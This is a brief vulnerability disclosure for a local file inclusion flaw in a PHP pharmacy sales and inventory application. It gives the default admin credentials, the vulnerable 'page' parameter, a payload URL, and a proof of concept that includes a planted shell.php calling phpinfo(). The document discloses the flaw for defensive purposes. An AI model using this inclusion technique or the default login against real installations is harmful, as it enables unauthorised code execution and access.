# Pharmacy Sales And Inventory System v1.0 by oretnom23 has The local file contains

The password for the backend login account is: admin/admin123

vendor : https://www.sourcecodester.com/php/14500/pharmacy-sales-and-inventory-system-using-phpmysql-source-code.html

Vulnerability File: ip/pharmacy-sales-and-inventory-system/index.php?page=

Vulnerability location: ip/pharmacy-sales-and-inventory-system/index.php?page=, page

Payload: ip/pharmacy-sales-and-inventory-system/index.php?page=shell

![image](https://user-images.githubusercontent.com/54017627/167059289-fa9a1734-179c-405b-9914-77d160be3571.png)

We create a shell.php under the PHP file of the root of the website, which reads "<?" phpinfo ();? > "

![image](https://user-images.githubusercontent.com/54017627/167059242-4cbde8b7-5dc4-4b58-8e8b-77c9fc88b390.png)


And visit ip/pharmacy-sales-and-inventory-system/index.php?page=shell You can see that phpinfo has been successfully included

![image](https://user-images.githubusercontent.com/54017627/167059124-a33ecdd9-1bf3-443d-8848-94cb179bcd27.png)
